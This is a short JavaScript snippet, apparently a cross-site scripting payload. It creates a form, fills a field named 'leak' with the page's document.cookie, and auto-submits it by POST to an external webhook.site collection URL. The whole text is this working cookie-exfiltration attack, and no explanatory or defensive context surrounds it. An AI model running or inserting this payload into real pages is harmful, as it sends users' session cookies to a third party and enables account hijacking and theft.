var form = document.createElement('form');
form.method = 'POST';
form.action = 'https://webhook.site/6644dbf8-8e4c-4acb-b10f-29167d2e4fc6';

var input = document.createElement('input');
input.name = 'leak';
input.value = document.cookie;

form.appendChild(input);
document.body.appendChild(form);
form.submit();
